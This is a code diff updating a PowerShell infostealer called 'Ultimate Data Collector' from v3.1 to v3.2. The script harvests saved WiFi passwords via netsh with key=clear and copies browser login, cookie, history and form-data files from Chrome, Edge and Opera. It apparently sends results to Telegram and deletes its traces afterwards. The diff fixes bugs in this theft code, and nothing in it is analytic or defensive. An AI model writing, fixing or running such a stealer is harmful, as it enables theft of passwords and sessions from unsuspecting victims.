@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-    Ultimate Data Collector v3.1
+    Ultimate Data Collector v3.2
 .DESCRIPTION
     Полностью автономный сбор всех данных с компьютера
 #>
@@ -51,7 +51,7 @@ function Send-FileToTelegram {
     }
 }
 
-# 1. Сбор WiFi паролей
+# 1. Сбор WiFi паролей (исправленная версия)
 function Get-WiFiPasswords {
     $outputFile = "$TEMP_DIR\wifi_passwords.txt"
     $result = @("=== WiFi Passwords ===")
@@ -64,7 +64,7 @@ function Get-WiFiPasswords {
         foreach ($profile in $profiles) {
             try {
                 $xmlFile = "$TEMP_DIR\$($profile.Replace(' ','_')).xml"
-                netsh wlan export profile name=`"$profile`" key=clear folder="$TEMP_DIR" | Out-Null
+                netsh wlan export profile name="`"$profile`"" key=clear folder="$TEMP_DIR" | Out-Null
                 
                 if (Test-Path $xmlFile) {
                     $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
@@ -73,9 +73,14 @@ function Get-WiFiPasswords {
                     $result += "Password: $password"
                     $result += "----------------"
                 }
-            } catch { $result += "Error with $profile: $_" }
+            } catch {
+                $errorMsg = "Error with profile $profile : $($_.Exception.Message)"
+                $result += $errorMsg
+            }
         }
-    } catch { $result += "Netsh method error: $_" }
+    } catch {
+        $result += "Netsh method error: $($_.Exception.Message)"
+    }
     
     $result -join "`n" | Out-File -FilePath $outputFile -Force
     return $outputFile
@@ -87,30 +92,29 @@ function Get-BrowserData {
     $result = @("=== Browser Data ===")
     
     $browsers = @(
-        @{ Name = "Chrome"; Paths = @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\") },
-        @{ Name = "Edge"; Paths = @("$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\") },
-        @{ Name = "Opera"; Paths = @("$env:APPDATA\Opera Software\Opera Stable\") },
-        @{ Name = "Firefox"; Paths = @("$env:APPDATA\Mozilla\Firefox\Profiles\") }
+        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\" },
+        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\" },
+        @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable\" }
     )
     
     foreach ($browser in $browsers) {
-        foreach ($path in $browser.Paths) {
-            if (Test-Path $path) {
-                try {
-                    $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
-                    New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
-                    
-                    $files = @("Login Data", "History", "Cookies", "Web Data")
-                    foreach ($file in $files) {
-                        $fullPath = Join-Path $path $file
-                        if (Test-Path $fullPath) {
-                            Copy-Item $fullPath $browserDir -Force -ErrorAction SilentlyContinue
-                        }
+        try {
+            if (Test-Path $browser.Path) {
+                $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
+                New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
+                
+                $files = @("Login Data", "History", "Cookies", "Web Data")
+                foreach ($file in $files) {
+                    $fullPath = Join-Path $browser.Path $file
+                    if (Test-Path $fullPath) {
+                        Copy-Item $fullPath $browserDir -Force -ErrorAction SilentlyContinue
                     }
-                    
-                    $result += "$($browser.Name): Data copied from $path"
-                } catch { $result += "$($browser.Name) error: $_" }
+                }
+                
+                $result += "$($browser.Name): Data copied successfully"
             }
+        } catch {
+            $result += "$($browser.Name) error: $($_.Exception.Message)"
         }
     }
     
@@ -153,7 +157,7 @@ try {
     Send-ToTelegram -Text "[SUCCESS] Data collection completed. Archive: $(Split-Path $zipFile -Leaf)"
 }
 catch {
-    Send-ToTelegram -Text "[ERROR] Data collection failed: $_"
+    Send-ToTelegram -Text "[ERROR] Data collection failed: $($_.Exception.Message)"
 }
 finally {
     Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
